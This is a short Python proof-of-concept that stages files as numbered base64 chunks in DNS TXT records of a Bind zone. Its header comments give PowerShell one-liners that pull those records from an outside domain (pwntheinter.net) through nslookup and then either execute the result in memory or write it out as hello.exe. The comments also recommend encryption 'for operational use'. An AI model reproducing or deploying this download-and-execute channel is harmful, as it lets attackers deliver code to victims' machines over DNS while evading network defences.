#!/usr/bin/env python

# Very simple PoC Python script for encoding files in DNS TXT records for use in Bind.
# This PoC is not meant to be covert, data is only base64 encoded and clearly numbered.
# For operational use, the data should be encrypted then, on the receiving end, decrypted
# and sorted to correctly piece it back together.  
#
# One possible usage is via PowerShell to load a script from these TXT records:
#
# .([scriptblock]::Create([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String((((nslookup -q=txt ipfp.txt.pwntheinter.net) | Sort-Object | where { $_.startswith([char]9) }) -join "" -replace '\t"\d{1,}.|"', '')))))
#
# Or drop an exe:
#
# [IO.File]::WriteAllBytes("hello.exe", [Convert]::FromBase64String((((nslookup -q=txt hello.txt.pwntheinter.net) | Sort-Object | where { $_.startswith([char]9) }) -join "" -replace '\t"\d{1,}.|"', '')))

import base64
import os

def get_parameter(text,default=None):

	while(1):
		result = raw_input(text + 
			(" [" + default + "]" if default else "") + 
			": ")
		if not result and not default:
			print("\nInput for %s is required.\n" % text)
		elif not result:
			return default
		else:
			return result
			
def main():

	scriptFile = get_parameter("Path to file you want to encode")
	txtRecord = get_parameter("TXT record to use")
	fwdZoneFile = get_parameter("Path to Bind forward zone file","StdOut")
	restartBind = get_parameter("Restart Bind? (y/n)","n")

	# Read data you want to encode from file

	try:
		with open(scriptFile) as f:
			data = f.read()
	except:
		print("Trouble opening %s" % scriptFile)
		exit(1)

	# Base64 encode the data, decode to UTF-8 string

	# data_encoded = base64.b64encode(data.encode()).decode("utf-8")
	data_encoded = base64.b64encode(data).decode("utf-8")

	# Loop through encoded data to create txt records in format:
	# <TXT record name> IN TXT XXXXX.<up to 249 characters 
	# of additional data>

	length=251
	output = ""
	count=1
	for i in range(0,len(data_encoded),length):
		output += (txtRecord + " IN TXT \"" + 
			str(count).zfill(3) + "." +
			data_encoded[i:i+length] + "\"\n")
		count+=1

	# Output TXT records

	if fwdZoneFile != "StdOut":
		try:
			with open(fwdZoneFile,"a+") as f:
				f.write(output)
		except:
			print("\nTrouble writing to %s...\n" % fwdZoneFile)
			if get_parameter("Print to screen?(y/n)","y").lower() == "y":
				print(output)

	if restartBind.lower() == 'y':
		print('Restarting bind...')
		os.system('service bind9 restart')
				
if __name__ == '__main__':
	main()
